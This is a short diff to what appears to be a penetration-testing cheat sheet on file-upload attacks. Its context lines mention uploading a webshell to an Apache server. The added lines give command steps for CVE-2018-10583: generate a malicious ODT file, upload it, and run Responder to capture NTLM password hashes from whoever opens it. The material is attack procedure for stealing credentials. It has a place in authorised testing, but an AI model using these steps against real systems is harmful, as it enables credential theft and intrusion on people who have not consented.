@@ -90,3 +90,10 @@ Note that this attack relies on the following options being enabled, and NGINX d
 /etc/apache2/apache2.conf:      AllowOverride FileInfo
 ```
 Upload webshell.evil, then access webshell.evil
+### ODT file upload to get hash
+CVE-2018-10583
+```
+python3 CVE-2018-10583.py >> bad.odt
+Upload bad.odt 
+sudo responder -I tun0 -A 
+```
